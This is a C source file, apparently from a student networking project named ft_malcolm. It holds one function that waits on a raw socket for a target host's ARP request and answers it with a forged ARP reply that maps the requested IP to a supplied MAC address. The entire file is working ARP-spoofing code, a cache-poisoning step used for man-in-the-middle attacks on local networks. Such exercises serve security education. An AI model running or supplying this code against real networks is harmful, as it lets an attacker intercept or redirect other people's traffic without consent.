#include "ft_malcolm.h"

void listen_and_spoof(
    int sockfd,
    struct in_addr src_ip,
    unsigned char *src_mac,
    struct in_addr target_ip,
    unsigned char *target_mac)
{
    unsigned char buffer[42];
    struct ether_header *eth;
    struct ether_arp *arp;
    ssize_t len;

    printf("Waiting for ARP request...\n");

    while (g_env.running)
    {
        len = recvfrom(sockfd, buffer, sizeof(buffer), 0, NULL, NULL);
        if (len < 0)
        {
            if (!g_env.running)
                return;
            continue;
        }

        eth = (struct ether_header *)buffer;
        if (ntohs(eth->ether_type) != ETHERTYPE_ARP)
            continue;

        arp = (struct ether_arp *)(buffer + sizeof(struct ether_header));

        if (ntohs(arp->ea_hdr.ar_op) != ARP_REQUEST)
            continue;

        if (memcmp(arp->arp_spa, &target_ip, 4) == 0 &&
            memcmp(arp->arp_tpa, &src_ip, 4) == 0)
            break;
    }

    if (!g_env.running)
        return;

    printf("ARP request detected. Sending spoofed reply...\n");

    struct sockaddr_ll addr;
    memset(&addr, 0, sizeof(addr));
    addr.sll_family = AF_PACKET;
    addr.sll_halen = ETH_ALEN;
    memcpy(addr.sll_addr, target_mac, 6);

    eth->ether_type = htons(ETHERTYPE_ARP);
    memcpy(eth->ether_dhost, target_mac, 6);
    memcpy(eth->ether_shost, src_mac, 6);

    arp->ea_hdr.ar_op = htons(ARP_REPLY);
    memcpy(arp->arp_sha, src_mac, 6);
    memcpy(arp->arp_spa, &src_ip, 4);
    memcpy(arp->arp_tha, target_mac, 6);
    memcpy(arp->arp_tpa, &target_ip, 4);

    sendto(sockfd, buffer, 42, 0, (struct sockaddr *)&addr, sizeof(addr));
    printf("Sent ARP reply. Exiting.\n");
}
